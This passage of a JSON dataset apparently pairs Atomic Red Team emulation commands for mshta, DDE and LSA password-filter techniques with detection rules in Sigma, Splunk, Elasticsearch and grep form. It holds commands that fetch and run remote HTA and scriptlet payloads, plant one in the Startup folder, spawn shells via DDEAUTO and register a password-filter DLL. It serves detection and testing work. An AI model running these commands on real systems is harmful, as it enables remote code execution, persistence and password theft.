\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\n", "name": null}, {"source": "atomics/T1170/T1170.yaml", "command": "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta\"\n$var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta\"\nmshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta\"\n", "name": null}, {"source": "SysmonHunter - Mshta", "command": "vbscript|javascript|http|https\\\\windows\\\\.+\\\\mshta.exe", "name": null}], "command_list": ["mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct')).Exec();close();      \n", "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run(\"\"{local_file_path}\"\")(window.close)\")\n", "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file $PathToAtomicsFolder\\T1170\\src\\powershell.ps1\"\":close\")\n", "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\n", "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta\"\n$var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta\"\nmshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta\"\n", "vbscript|javascript|http|https\\\\windows\\\\.+\\\\mshta.exe"], "technique_id": "T1170", "parsed_datasets": [{"Atomic Red Team Test - Mshta": {"display_name": "Mshta", "atomic_tests": [{"description": "Test execution of a remote script using mshta.exe\n", "supported_platforms": ["windows"], "name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject", "input_arguments": {"file_url": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct", "type": "Url", "description": "location of the payload"}}, "executor": {"elevation_required": false, "command": "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();      \n", "name": "command_prompt"}}, {"description": "Tests execution of a local program by a VBScript file called by Mshta", "supported_platforms": ["windows"], "name": "Mshta calls a local VBScript file to launch notepad.exe", "input_arguments": {"local_file": {"default": "C:\\Temp\\mshta_notepad.vbs", "type": "path", "description": "Create a local VBScript file"}}, "executor": {"command": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run(\"\"{local_file_path}\"\")(window.close)\")\n", "name": "command_prompt"}}, {"description": "Run a local VB script to run local user enumeration powershell command\n\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\n", "supported_platforms": ["windows"], "name": "Mshta executes VBScript to execute malicious command", "executor": {"command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file $PathToAtomicsFolder\\T1170\\src\\powershell.ps1\"\":close\")\n", "name": "command_prompt"}}, {"description": "Execute an arbitrary remote HTA.\n", "supported_platforms": ["windows"], "name": "Mshta Executes Remote HTML Application (HTA)", "input_arguments": {"hta_url": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta", "type": "string", "description": "URL to HTA file for execution"}, "temp_file": {"default": "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta", "type": "string", "description": "temp_file location for hta"}}, "executor": {"command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\n", "name": "powershell", "cleanup_command": "remove-item \"#{temp_file}\" -ErrorAction Ignore\n"}}], "attack_technique": "T1170"}}, {"SysmonHunter - T1170": {"phase": "Execution", "query": [{"process": {"cmdline": {"pattern": "vbscript|javascript|http|https"}, "image": {"pattern": "\\\\windows\\\\.+\\\\mshta.exe", "flag": "regex"}}, "type": "process"}], "description": null, "name": "Mshta", "level": "medium"}}], "queries": [{"query": "Sysmon| where (EventID == 11 or EventID == 15)and file_name contains \".hta\"", "product": "Azure Sentinel", "name": "MSHTA FileAccess"}, {"query": "Sysmon| where EventID == 3and (process_command_line contains \"mshta.exe\"or process_parent_command_line contains \"mshta.exe\")", "product": "Azure Sentinel", "name": "MSHTA Network"}, {"query": "Sysmon| where EventID == 1and (process_command_line contains \"mshta.exe\"or process_parent_command_line contains \"mshta.exe\")", "product": "Azure Sentinel", "name": "MSHTA Process"}, {"query": "title: MSHTA spwaned by SVCHOST as seen in LethalHTA\nid: ed5d72a6-f8f4-479d-ba79-02f6a80d7471\nstatus: experimental\ndescription: Detects MSHTA.EXE spwaned by SVCHOST described in report\nreferences:\n    - https://codewhitesec.blogspot.com/2018/07/lethalhta.html\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1170\nauthor: Markus Neis\ndate: 2018/06/07\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\svchost.exe'\n        Image: '*\\mshta.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: MSHTA spwaned by SVCHOST as seen in LethalHTA\nid: ed5d72a6-f8f4-479d-ba79-02f6a80d7471\nstatus: experimental\ndescription: Detects MSHTA.EXE spwaned by SVCHOST described in report\nreferences:\n    - https://codewhitesec.blogspot.com/2018/07/lethalhta.html\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1170\nauthor: Markus Neis\ndate: 2018/06/07\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\svchost.exe'\n        Image: '*\\mshta.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\svchost.exe AND Image.keyword:*\\\\\\\\mshta.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/MSHTA-spwaned-by-SVCHOST-as-seen-in-LethalHTA <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"MSHTA spwaned by SVCHOST as seen in LethalHTA\",\\n    \"description\": \"Detects MSHTA.EXE spwaned by SVCHOST described in report\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1170\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\svchost.exe AND Image.keyword:*\\\\\\\\\\\\\\\\mshta.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\svchost.exe AND Image.keyword:*\\\\\\\\\\\\\\\\mshta.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'MSHTA spwaned by SVCHOST as seen in LethalHTA\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\svchost.exe AND Image.keyword:*\\\\\\\\mshta.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\svchost.exe\" Image=\"*\\\\\\\\mshta.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\svchost.exe\" Image=\"*\\\\\\\\mshta.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\svchost\\\\.exe)(?=.*.*\\\\mshta\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Mshta Network Connections\nid: 67f113fa-e23d-4271-befa-30113b3e08b1\ndescription: Identifies suspicious mshta.exe commands\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1170/T1170.yaml\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1170\ndetection:\n    selection:\n        Image|endswith: '\\mshta.exe'\n        CommandLine|contains: 'javascript'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\n## todo \u2014 add sysmon eid 3 for this rule", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Mshta Network Connections\nid: 67f113fa-e23d-4271-befa-30113b3e08b1\ndescription: Identifies suspicious mshta.exe commands\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1170/T1170.yaml\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1170\ndetection:\n    selection:\n        Image|endswith: '\\mshta.exe'\n        CommandLine|contains: 'javascript'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows\n## todo \u2014 add sysmon eid 3 for this rule", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\mshta.exe AND CommandLine.keyword:*javascript*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Mshta-Network-Connections <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Mshta Network Connections\",\\n    \"description\": \"Identifies suspicious mshta.exe commands\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1170\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\mshta.exe AND CommandLine.keyword:*javascript*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\mshta.exe AND CommandLine.keyword:*javascript*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Mshta Network Connections\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\mshta.exe AND CommandLine.keyword:*javascript*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\mshta.exe\" CommandLine=\"*javascript*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\mshta.exe\" CommandLine=\"*javascript*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\mshta\\\\.exe)(?=.*.*javascript.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: MSHTA Spawning Windows Shell\nid: 03cc0c25-389f-4bf8-b48d-11878079f1ca\nstatus: experimental\ndescription: Detects a Windows command line executable started from MSHTA.\nreferences:\n    - https://www.trustedsec.com/july-2015/malicious-htas/\nauthor: Michael Haag\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\mshta.exe'\n        Image:\n            - '*\\cmd.exe'\n            - '*\\powershell.exe'\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n            - '*\\sh.exe'\n            - '*\\bash.exe'\n            - '*\\reg.exe'\n            - '*\\regsvr32.exe'\n            - '*\\BITSADMIN*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1170\n    - car.2013-02-003\n    - car.2013-03-001\n    - car.2014-04-003\nfalsepositives:\n    - Printer software / driver installations\n    - HP software\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: MSHTA Spawning Windows Shell\nid: 03cc0c25-389f-4bf8-b48d-11878079f1ca\nstatus: experimental\ndescription: Detects a Windows command line executable started from MSHTA.\nreferences:\n    - https://www.trustedsec.com/july-2015/malicious-htas/\nauthor: Michael Haag\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\mshta.exe'\n        Image:\n            - '*\\cmd.exe'\n            - '*\\powershell.exe'\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n            - '*\\sh.exe'\n            - '*\\bash.exe'\n            - '*\\reg.exe'\n            - '*\\regsvr32.exe'\n            - '*\\BITSADMIN*'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1170\n    - car.2013-02-003\n    - car.2013-03-001\n    - car.2014-04-003\nfalsepositives:\n    - Printer software / driver installations\n    - HP software\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\mshta.exe AND Image.keyword:(*\\\\\\\\cmd.exe OR *\\\\\\\\powershell.exe OR *\\\\\\\\wscript.exe OR *\\\\\\\\cscript.exe OR *\\\\\\\\sh.exe OR *\\\\\\\\bash.exe OR *\\\\\\\\reg.exe OR *\\\\\\\\regsvr32.exe OR *\\\\\\\\BITSADMIN*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/MSHTA-Spawning-Windows-Shell <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"MSHTA Spawning Windows Shell\",\\n    \"description\": \"Detects a Windows command line executable started from MSHTA.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1170\",\\n      \"car.2013-02-003\",\\n      \"car.2013-03-001\",\\n      \"car.2014-04-003\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\mshta.exe AND Image.keyword:(*\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\sh.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\reg.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\BITSADMIN*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\mshta.exe AND Image.keyword:(*\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\sh.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\reg.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\BITSADMIN*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'MSHTA Spawning Windows Shell\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:*\\\\\\\\mshta.exe AND Image.keyword:(*\\\\\\\\cmd.exe *\\\\\\\\powershell.exe *\\\\\\\\wscript.exe *\\\\\\\\cscript.exe *\\\\\\\\sh.exe *\\\\\\\\bash.exe *\\\\\\\\reg.exe *\\\\\\\\regsvr32.exe *\\\\\\\\BITSADMIN*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(ParentImage=\"*\\\\\\\\mshta.exe\" (Image=\"*\\\\\\\\cmd.exe\" OR Image=\"*\\\\\\\\powershell.exe\" OR Image=\"*\\\\\\\\wscript.exe\" OR Image=\"*\\\\\\\\cscript.exe\" OR Image=\"*\\\\\\\\sh.exe\" OR Image=\"*\\\\\\\\bash.exe\" OR Image=\"*\\\\\\\\reg.exe\" OR Image=\"*\\\\\\\\regsvr32.exe\" OR Image=\"*\\\\\\\\BITSADMIN*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage=\"*\\\\\\\\mshta.exe\" Image IN [\"*\\\\\\\\cmd.exe\", \"*\\\\\\\\powershell.exe\", \"*\\\\\\\\wscript.exe\", \"*\\\\\\\\cscript.exe\", \"*\\\\\\\\sh.exe\", \"*\\\\\\\\bash.exe\", \"*\\\\\\\\reg.exe\", \"*\\\\\\\\regsvr32.exe\", \"*\\\\\\\\BITSADMIN*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\mshta\\\\.exe)(?=.*(?:.*.*\\\\cmd\\\\.exe|.*.*\\\\powershell\\\\.exe|.*.*\\\\wscript\\\\.exe|.*.*\\\\cscript\\\\.exe|.*.*\\\\sh\\\\.exe|.*.*\\\\bash\\\\.exe|.*.*\\\\reg\\\\.exe|.*.*\\\\regsvr32\\\\.exe|.*.*\\\\BITSADMIN.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible Applocker Bypass\nid: 82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719\ndescription: Detects execution of executables that can be used to bypass Applocker whitelisting\nstatus: experimental\nreferences:\n    - https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt\n    - https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/\nauthor: juju4\ntags:\n    - attack.defense_evasion\n    - attack.t1118\n    - attack.t1121\n    - attack.t1127\n    - attack.t1170\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '\\msdt.exe'\n            - '\\installutil.exe'\n            - '\\regsvcs.exe'\n            - '\\regasm.exe'\n            # - '\\regsvr32.exe'  # too many FPs, very noisy\n            - '\\msbuild.exe'\n            - '\\ieexec.exe'\n            #- '\\mshta.exe'\n            #- '\\csc.exe'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\n    - Using installutil to add features for .NET applications (primarly would occur in developer environments)\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible Applocker Bypass\nid: 82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719\ndescription: Detects execution of executables that can be used to bypass Applocker whitelisting\nstatus: experimental\nreferences:\n    - https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt\n    - https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/\nauthor: juju4\ntags:\n    - attack.defense_evasion\n    - attack.t1118\n    - attack.t1121\n    - attack.t1127\n    - attack.t1170\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '\\msdt.exe'\n            - '\\installutil.exe'\n            - '\\regsvcs.exe'\n            - '\\regasm.exe'\n            # - '\\regsvr32.exe'  # too many FPs, very noisy\n            - '\\msbuild.exe'\n            - '\\ieexec.exe'\n            #- '\\mshta.exe'\n            #- '\\csc.exe'\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\n    - Using installutil to add features for .NET applications (primarly would occur in developer environments)\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\\\\\msdt.exe* OR *\\\\\\\\installutil.exe* OR *\\\\\\\\regsvcs.exe* OR *\\\\\\\\regasm.exe* OR *\\\\\\\\msbuild.exe* OR *\\\\\\\\ieexec.exe*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-Applocker-Bypass <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible Applocker Bypass\",\\n    \"description\": \"Detects execution of executables that can be used to bypass Applocker whitelisting\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1118\",\\n      \"attack.t1121\",\\n      \"attack.t1127\",\\n      \"attack.t1170\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\msdt.exe* OR *\\\\\\\\\\\\\\\\installutil.exe* OR *\\\\\\\\\\\\\\\\regsvcs.exe* OR *\\\\\\\\\\\\\\\\regasm.exe* OR *\\\\\\\\\\\\\\\\msbuild.exe* OR *\\\\\\\\\\\\\\\\ieexec.exe*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\\\\\\\\\msdt.exe* OR *\\\\\\\\\\\\\\\\installutil.exe* OR *\\\\\\\\\\\\\\\\regsvcs.exe* OR *\\\\\\\\\\\\\\\\regasm.exe* OR *\\\\\\\\\\\\\\\\msbuild.exe* OR *\\\\\\\\\\\\\\\\ieexec.exe*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible Applocker Bypass\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*\\\\\\\\msdt.exe* *\\\\\\\\installutil.exe* *\\\\\\\\regsvcs.exe* *\\\\\\\\regasm.exe* *\\\\\\\\msbuild.exe* *\\\\\\\\ieexec.exe*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\msdt.exe*\" OR CommandLine=\"*\\\\\\\\installutil.exe*\" OR CommandLine=\"*\\\\\\\\regsvcs.exe*\" OR CommandLine=\"*\\\\\\\\regasm.exe*\" OR CommandLine=\"*\\\\\\\\msbuild.exe*\" OR CommandLine=\"*\\\\\\\\ieexec.exe*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*\\\\\\\\msdt.exe*\", \"*\\\\\\\\installutil.exe*\", \"*\\\\\\\\regsvcs.exe*\", \"*\\\\\\\\regasm.exe*\", \"*\\\\\\\\msbuild.exe*\", \"*\\\\\\\\ieexec.exe*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*\\\\msdt\\\\.exe.*|.*.*\\\\installutil\\\\.exe.*|.*.*\\\\regsvcs\\\\.exe.*|.*.*\\\\regasm\\\\.exe.*|.*.*\\\\msbuild\\\\.exe.*|.*.*\\\\ieexec\\\\.exe.*)'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1173/T1173.yaml", "command": "start $PathToAtomicsFolder\\T1173\\bin\\DDE_Document.docx\n", "name": null}], "command_list": ["start $PathToAtomicsFolder\\T1173\\bin\\DDE_Document.docx\n"], "technique_id": "T1173", "parsed_datasets": [{"Atomic Red Team Test - Dynamic Data Exchange": {"display_name": "Dynamic Data Exchange", "atomic_tests": [{"description": "Executes commands via DDE using Microsfot Word\n", "supported_platforms": ["windows"], "name": "Execute Commands", "executor": {"steps": "Open Microsoft Word\n\nInsert tab -> Quick Parts -> Field\n\nChoose = (Formula) and click ok.\n\nAfter that, you should see a Field inserted in the document with an error \"!Unexpected End of Formula\", right-click the Field, and choose Toggle Field Codes.\n\nThe Field Code should now be displayed, change it to Contain the following:\n\n{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"  }\n", "name": "manual"}}, {"description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n", "supported_platforms": ["windows"], "name": "Execute PowerShell script via Word DDE", "executor": {"elevation_required": false, "command": "start $PathToAtomicsFolder\\T1173\\bin\\DDE_Document.docx\n", "name": "command_prompt"}}], "attack_technique": "T1173"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1174/T1174.yaml", "command": "$passwordFilterName = (Copy-Item \"PathToAtomicsFolder\\T1174\\src\\AtomicPasswordFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\nRestart-Computer -Confirm", "name": null}], "command_list": ["$passwordFilterName = (Copy-Item \"PathToAtomicsFolder\\T1174\\src\\AtomicPasswordFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = 